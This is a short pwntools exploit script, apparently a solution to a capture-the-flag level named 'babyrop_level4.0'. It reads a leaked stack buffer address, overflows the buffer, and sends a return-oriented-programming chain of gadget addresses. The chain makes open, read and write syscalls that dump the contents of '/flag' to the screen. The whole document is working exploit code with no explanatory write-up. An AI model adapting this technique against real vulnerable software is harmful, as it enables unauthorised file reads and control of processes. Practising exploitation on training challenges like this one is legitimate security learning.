from pwn import *

pop_rax = 0x402475
pop_rdi = 0x40247d
pop_rsi = 0x40246d
pop_rdx = 0x402485
syscall = 0x402465

r = process('/challenge/babyrop_level4.0')
r.recvuntil(b'located at: ')
buffer = int(r.recv(14),16)
print(hex(buffer))
payload = b'/flag'.ljust(0x38,b'\x00')
payload += p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(buffer)+ p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx) + p64(0x40) + p64(syscall)
payload += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx) + p64(0x40) + p64(syscall)
r.send(payload)

r.interactive()